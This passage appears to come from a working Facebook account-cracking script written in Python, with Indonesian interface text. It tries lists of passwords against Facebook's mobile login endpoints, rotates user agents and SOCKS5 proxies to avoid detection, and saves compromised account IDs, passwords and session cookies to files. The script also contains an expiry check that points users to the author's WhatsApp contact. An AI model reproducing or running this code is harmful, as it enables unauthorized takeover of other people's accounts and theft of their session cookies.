'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				tree = Tree(f"[b white]{M2}{ddealin}")
				tree.add(f"{K2}Login Gagal{P2}")
				tree.add(f"{K2}{idf}|{pw}{P2}")
				tree.add(f"{K2}{ua}{P2}")
				cetak(tree)
				os.popen('play-audio cpeh.mp3')
				open('CP/'+ddealin,'a').write(idf+'|'+pw+'\n')
				break
			elif 'c_user' in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				tree = Tree(f"[b white]{ddetrisha}")
				tree.add(f"{H2}Login Sukses{P2}")
				tree.add(f"{H2}{idf}|{pw}{P2}")
				tree.add(f"{U2}{kuki}{P2}")
				cetak(tree)
				os.popen('play-audio okeh.mp3')
				open('OK/'+ddetrisha,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
### ----- [ CrackWithTrisha ] ---- ###
def CrackTrisha(idf,pw_adel):
	global loop,ok,cp
	prog.update(des,description=f'\r{M}{loop}/{len(id)} {H}OK-:{ok} {K}CP-:{cp}  ')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pw_adel:
		try:
			if 'ya' in uadel: ua = uaadel[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.cinyour.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				tree = Tree(f"[b white]{M2}{ddealin}")
				tree.add(f"{K2}Login Gagal{P2}")
				tree.add(f"{K2}{idf}|{pw}{P2}")
				tree.add(f"{K2}{ua}{P2}")
				cetak(tree)
				os.popen('play-audio cpeh.mp3')
				open('CP/'+ddealin,'a').write(idf+'|'+pw+'\n')
				break
			elif 'c_user' in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				tree = Tree(f"[b white]{ddetrisha}")
				tree.add(f"{H2}Login Sukses{P2}")
				tree.add(f"{H2}{idf}|{pw}{P2}")
				tree.add(f"{U2}{kuki}{P2}")
				cetak(tree)
				os.popen('play-audio okeh.mp3')
				open('OK/'+ddetrisha,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
### ----- [ SystemAkhirByJKT48 ] ----- ###
def SiKalemAdel():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/DUMP')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	loginadel()
### ----- [ Exspired Script ] ----- ###
expired = ['03','04', '2024']
saat_ini = datetime.datetime.now()
tgl = saat_ini.strftime('%d')
bln = saat_ini.strftime('%m')
thn = saat_ini.strftime('%Y')
waktu_new = (tgl+"-"+bln+"-"+thn)

if __name__=="__main__":
	tanggal = thn + bln + tgl
	exp = expired[2] + expired[1] + expired[0]
	if tanggal >= exp:
		os.system("clear")
		print('\033[0m')
		cetak(panel(f"{P2}[{M2}!{P2}] Script JKT48 Telah Kadaluarsa Silahkan Hubungi Author\n{P2}[{H2}!{P2}] Whatsapp : {H2}+6285779589954",width=70,title=f"[b white] Exspired Script ",subtitle=f"[b red] Update : 10-04-2024 ",style=f"{jkt_48}"))
	else:
		os.system('git pull')
		SiKalemAdel()
